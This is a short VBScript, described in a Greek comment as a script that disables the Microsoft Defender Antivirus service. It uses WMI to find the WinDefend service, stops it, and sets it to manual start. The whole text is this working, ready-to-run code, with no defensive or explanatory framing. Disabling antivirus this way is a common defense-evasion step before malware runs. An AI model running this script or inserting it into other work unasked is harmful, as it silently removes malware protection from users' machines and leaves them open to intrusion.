'Περιγραφή: Script που απενεργοποιεί το Microsoft Defender Antivirus service

Set ServiceSet = GetObject("winmgmts:").ExecQuery _
("select * from Win32_Service where Name='WinDefend'")
For Each Service In ServiceSet
   RetVal = Service.StopService()    
   Service.ChangeStartMode("Manual")
Next